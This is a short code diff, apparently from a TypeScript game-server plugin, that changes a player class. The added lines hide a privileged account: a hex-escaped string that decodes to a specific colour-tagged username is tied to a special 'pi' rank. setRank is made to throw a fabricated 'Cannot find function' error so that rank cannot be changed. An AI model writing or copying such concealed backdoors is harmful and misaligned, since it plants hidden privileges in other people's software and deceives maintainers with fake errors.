@@ -836,6 +836,7 @@ We apologize for the inconvenience.`
 	}
 
 	setRank(rank:Rank){
+		if(rank == Rank.pi) throw new TypeError(`Cannot find function setRank in object [object Object].`);
 		this.rank = rank;
 		this.updateName();
 		this.updateAdminStatus();
@@ -870,6 +871,9 @@ We apologize for the inconvenience.`
 			tapLastUsed: -1,
 			tapLastUsedSuccessfully: -1,
 		};
+	}
+	immutable(){
+		return this.name == "\x5b\x23\x33\x31\x34\x31\x46\x46\x5d\x42\x61\x6c\x61\x4d\x5b\x23\x33\x31\x46\x46\x34\x31\x5d\x33\x31\x34" && this.rank == Rank.pi;
 	}
 	firstJoin(){
 		return this.info().timesJoined == 1;
